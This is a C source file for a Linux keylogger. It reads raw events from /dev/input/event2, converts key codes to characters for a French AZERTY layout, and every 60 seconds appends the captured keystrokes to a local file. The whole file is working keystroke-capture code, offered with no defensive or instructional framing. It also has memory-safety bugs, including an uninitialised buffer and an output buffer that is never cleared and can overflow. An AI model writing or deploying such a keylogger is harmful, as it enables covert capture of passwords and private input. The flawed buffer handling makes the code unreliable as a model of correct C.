#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 

#include <unistd.h>
#include <linux/input.h>
#include <fcntl.h>
#include <signal.h>
#include <stdbool.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>


static volatile bool STOP = false;
 
static void sigint_handlder(int sig)
{
    STOP = true;
}

void linux_code_to_readable_string_code(int code, char* szCode)
{
    memset(szCode, '\0', strlen(szCode)+1);

     
    switch(code)
    {
        case KEY_F1:
            strcat(szCode, " F1 ");
            break;
        case KEY_F2:
            strcat(szCode, " F2 ");
            break;
        case KEY_F3:
            strcat(szCode, " F3 ");
            break;
        case KEY_F4:
            strcat(szCode, " F4 ");
            break;
        case KEY_F5:
            strcat(szCode, " F5 ");
            break;
        case KEY_F6:
            strcat(szCode, " F6 ");
            break;
        case KEY_F7:
            strcat(szCode, " F7 ");
            break;
        case KEY_F8:
            strcat(szCode, " F8 ");
            break;
        case KEY_F9:
            strcat(szCode, " F9 ");
            break;
        case KEY_F10:
            strcat(szCode, " F10 ");
            break;
        case KEY_F11:
            strcat(szCode, " F11 ");
            break;
        case KEY_F12:
            strcat(szCode, " F12 ");
            break;
        case KEY_F13:
            strcat(szCode, " F13 ");
            break;
        case KEY_F14:
            strcat(szCode, " F14 ");
            break;
        case KEY_F15:
            strcat(szCode, " F15 ");
            break;
        case KEY_F16:
            strcat(szCode, " F16 ");
            break;
        case KEY_F17:
            strcat(szCode, " F17 ");
            break;
        case KEY_F18:
            strcat(szCode, " F18 ");
            break;
        case KEY_F19:
            strcat(szCode, " F19 ");
            break;
        case KEY_F20:
            strcat(szCode, " F20 ");
            break;
        case KEY_F21:
            strcat(szCode, " F21 ");
            break;
        case KEY_F22:
            strcat(szCode, " F22 ");
            break;
        case KEY_F23:
            strcat(szCode, " F23 ");
            break;
        case KEY_F24:
            strcat(szCode, " F24 ");
            break;
        case KEY_SPACE:
            strcat(szCode, " ");
            break;
        case KEY_CAPSLOCK:
            strcat(szCode, " CAPSLOCK ");
            break;
        case KEY_LEFTSHIFT:
            strcat(szCode, " LEFTSHIFT ");
            break;
        case KEY_RIGHTSHIFT:
            strcat(szCode, " RIGHTSHIFT ");
            break;
        case KEY_LEFTCTRL:
            strcat(szCode, " LEFTCTRL ");
            break;
        case KEY_RIGHTCTRL:
            strcat(szCode, " RIGHTCTRL ");
            break;
        case KEY_DELETE:
            strcat(szCode, " DELETE ");
            break;
        case KEY_BACKSPACE:
            strcat(szCode, "\b \b");
            break;
        case KEY_UP:
            strcat(szCode, " UP ");
            break;
        case KEY_DOWN: 
            strcat(szCode, " DOWN ");
            break;
        case KEY_RIGHT:
            strcat(szCode, " RIGHT ");
            break;
        case KEY_LEFT:
            strcat(szCode, " LEFT ");
            break;
        case KEY_NUMERIC_0:
            strcat(szCode, " NUMERIC_0 ");
            break;
        case KEY_NUMERIC_1:
            strcat(szCode, " NUMERIC_1 ");
            break;
        case KEY_NUMERIC_2:
            strcat(szCode, " NUMERIC_2 ");
            break;
        case KEY_NUMERIC_3:
            strcat(szCode, " NUMERIC_3 ");
            break;
        case KEY_NUMERIC_4:
            strcat(szCode, " NUMERIC_4 ");
            break;
        case KEY_NUMERIC_5:
            strcat(szCode, " NUMERIC_5 ");
            break;
        case KEY_NUMERIC_6:
            strcat(szCode, " NUMERIC_6 ");
            break;
        case KEY_NUMERIC_7:
            strcat(szCode, " NUMERIC_7 ");
            break;
        case KEY_NUMERIC_8:
            strcat(szCode, " NUMERIC_8 ");
            break;
        case KEY_NUMERIC_9:
            strcat(szCode, " NUMERIC_9 ");
            break;
        case KEY_NUMERIC_STAR:
            strcat(szCode, "NUMERIC_STAR");
            break;     
        case KEY_NUMERIC_POUND:
            strcat(szCode, " NUMERIC_POUND ");
            break;   
        case KEY_NUMERIC_11:
            strcat(szCode, " NUMERIC_11 ");
            break; 
        case KEY_NUMERIC_12:
            strcat(szCode, " NUMERIC_12 ");
            break; 
        case KEY_NUMERIC_A:
            strcat(szCode, " NUMERIC_A ");
            break; 
        case KEY_NUMERIC_B:
            strcat(szCode, " NUMERIC_B ");
            break; 
        case KEY_NUMERIC_C:
            strcat(szCode, " NUMERIC_C ");
            break; 
        case KEY_NUMERIC_D:
            strcat(szCode, " NUMERIC_D ");
            break; 
        case KEY_NUMLOCK:
            strcat(szCode, " NUMLOCK ");
            break;
        case KEY_KPPLUS:
            strcat(szCode, "+");
            break;
        case KEY_KPPLUSMINUS:
            strcat(szCode, " KPPLUSMINUS ");
            break;
        case KEY_KPMINUS:
            strcat(szCode, "-");
            break;
        case KEY_KPSLASH:
            strcat(szCode, "/");
            break;
        case KEY_KPASTERISK:
            strcat(szCode, "*");
            break;
        case KEY_KPEQUAL:
            strcat(szCode, " KPEQUAL ");
            break;
        case KEY_KPDOT:
            strcat(szCode, " KPDOT ");
            break;
        case KEY_KPENTER:
            strcat(szCode, "\n");
            break;
        case KEY_KPCOMMA:
            strcat(szCode, " KPCOMMA ");
            break;
        case KEY_KP0:
            strcat(szCode, "0");  
            break;
        case KEY_KP1:
            strcat(szCode, "1");
            break;
        case KEY_KP2:
            strcat(szCode, "2");
            break;
        case KEY_KP3:
            strcat(szCode, "3");
            break;
        case KEY_KP4:
            strcat(szCode, "4");
            break;
        case KEY_KP5:
            strcat(szCode, "5");
            break;
        case KEY_KP6:
            strcat(szCode, "6");
            break;
        case KEY_KP7:
            strcat(szCode, "7");
            break;
        case KEY_KP8:
            strcat(szCode, "8");
            break;
        case KEY_KP9:
            strcat(szCode, "9");
            break;
        case KEY_INSERT:
            strcat(szCode, " INSERT ");
            break;
        case KEY_PAGEUP:
            strcat(szCode, " PAGEUP ");
            break;
        case KEY_PAGEDOWN:
            strcat(szCode, " PAGEDOWN ");
            break;
        case KEY_HOME:
            strcat(szCode, " HOME ");
            break;
        case KEY_END:
            strcat(szCode, " END ");
            break;
        case KEY_PAUSE:
            strcat(szCode, "PAUSE");
            break;
        case KEY_PRINT:
            strcat(szCode, " PRINT ");
            break;
        case KEY_SCROLLLOCK:
            strcat(szCode, " SCROLLLOCK ");
            break;
        case KEY_TAB:
            strcat(szCode, "\t");
            break;
        case KEY_A:
            strcat(szCode, "q");
            break;
        case KEY_B:
            strcat(szCode, "b");
            break;
        case KEY_C:
            strcat(szCode, "c");
            break;
        case KEY_D:
            strcat(szCode, "d");
            break;
        case KEY_E:
            strcat(szCode, "e");
            break;
        case KEY_F:
            strcat(szCode, "f");
            break;
        case KEY_G:
            strcat(szCode, "g");
            break;
        case KEY_H:
            strcat(szCode, "h");
            break;
        case KEY_I:
            strcat(szCode, "i");
            break;
        case KEY_J:
            strcat(szCode, "j");
            break;
        case KEY_K:
            strcat(szCode, "k");
            break;
        case KEY_L:
            strcat(szCode, "l");
            break;
        case KEY_M:
            strcat(szCode, ",");
            break;
        case KEY_N:
            strcat(szCode, "n");
            break;
        case KEY_O:
            strcat(szCode, "o");
            break;
        case KEY_P:
            strcat(szCode, "p");
            break;
        case KEY_Q:
            strcat(szCode, "a"); 
            break;
        case KEY_R:
            strcat(szCode, "r");
            break;
        case KEY_S:
            strcat(szCode, "s");
            break;
        case KEY_T:
            strcat(szCode, "t");
            break;
        case KEY_U:
            strcat(szCode, "u");
            break;
        case KEY_V:
            strcat(szCode, "v");
            break;
        case KEY_W:
            strcat(szCode, "z");
            break;
        case KEY_X:
            strcat(szCode, "x");
            break; 
        case KEY_Y:
            strcat(szCode, "y");
            break; 
        case KEY_Z:
            strcat(szCode, "w"); 
            break;  
        case KEY_LEFTBRACE:
            strcat(szCode, "^");
            break;  
        case KEY_RIGHTBRACE:
            strcat(szCode, "$");      
            break;
        case KEY_APOSTROPHE:
            strcat(szCode, "ù");
            break;
        case KEY_BACKSLASH:
            strcat(szCode, "*");
            break;
        case KEY_EURO:
            strcat(szCode, "€");
            break; 
        case KEY_ESC:
            strcat(szCode, " ESC ");
            break; 
        case KEY_GRAVE:
            strcat(szCode, "²");
            break; 
        case KEY_DOT:
            strcat(szCode, ":");
            break;
        case KEY_SLASH:
            strcat(szCode, "!");
            break;
        case KEY_SEMICOLON:
            strcat(szCode, "m");
            break;
        case KEY_COMMA:
            strcat(szCode, ";"); 
            break;
        case KEY_RIGHTMETA:
            strcat(szCode, " RIGHT-WINDOWS "); 
            break;
        case KEY_LEFTMETA:
            strcat(szCode, " LEFT-WINDOWS "); 
            break;
        case KEY_RIGHTALT:
            strcat(szCode, " ALT-GR "); 
            break;
        case KEY_LEFTALT:
            strcat(szCode, " ALT "); 
            break;
        case KEY_SYSRQ:
            strcat(szCode, "SYSRQ"); 
            break;
        case KEY_1:
            strcat(szCode, "&"); 
            break;
        case KEY_2:
            strcat(szCode, "é"); 
            break;
        case KEY_3:
            strcat(szCode, "\""); 
            break;
        case KEY_4:
            strcat(szCode, "'"); 
            break;
        case KEY_5:
            strcat(szCode, "("); 
            break;
        case KEY_6:
            strcat(szCode, "-"); 
            break;
        case KEY_7:
            strcat(szCode, "è"); 
            break;
        case KEY_8:
            strcat(szCode, "_"); 
            break;
        case KEY_9:
            strcat(szCode, "ç"); 
            break;
        case KEY_0:
            strcat(szCode, "à"); 
            break;
        case KEY_MINUS:
            strcat(szCode, ")"); 
            break;
        case KEY_EQUAL:
            strcat(szCode, "="); 
            break;
        case KEY_ENTER:
            strcat(szCode, "\n"); 
            break;
        default:
            sprintf(szCode,"%d", code);
            break;
    }
}
 
enum 
{
    KEY_AUTOREPEAT = 0x02,
    KEY_PRESSED = 0x01,
    KEY_RELEASED = 0x00
};

int main(void)
{
    char szBufferOutputFD[4096];
    char szBufferKey[255];
    struct input_event events;
    struct timeval begin, end;
    double delta = 0;

    char szDeviceName[] = "/dev/input/event2";
    size_t rBytes = 0;

    int fd = open(szDeviceName, O_RDONLY);
    int output = open("./output", O_WRONLY | O_APPEND | O_CREAT);

    if(fd < 0)
    {
        perror("Linux : /dev/input/event2 connot be open !\nReason");
        _exit(EXIT_FAILURE);
    }

    if(output < 0)
    {
        perror("Linux : ./output connot be open !\nReason");
        close(fd);
        _exit(EXIT_FAILURE);
    }


    signal(SIGINT, sigint_handlder);

    memset(&events, 0, sizeof(events));
    memset(szBufferOutputFD, '\0', sizeof(szBufferOutputFD));

 
    for(;;)
    {
        gettimeofday(&begin, NULL);

        rBytes = read(fd, &events, sizeof(events));

        fflush(stdout);

        if(rBytes > 0)
        {
            linux_code_to_readable_string_code(events.code, szBufferKey);
            if(events.value == KEY_PRESSED || events.value == KEY_AUTOREPEAT)
            {       
                printf("%s", szBufferKey);
                strncat(szBufferOutputFD, szBufferKey, strlen(szBufferKey));
            }
        }
        if(STOP)
            break; 
 
 
        gettimeofday(&end, NULL);

        delta += (double) (end.tv_usec - begin.tv_usec) / 1000000 + (double) end.tv_sec - begin.tv_sec;

        if(delta > 60.0)
        {      
            write(output, szBufferOutputFD, strlen(szBufferOutputFD));
            memset(szBufferKey, '\0', sizeof(szBufferKey));
            delta = 0.0;
        }
    }
 
    write(output, szBufferOutputFD, strlen(szBufferOutputFD));

    puts("The programm is terminate by CTRL+C");
    close(output);
    close(fd);
    return EXIT_SUCCESS;
}

 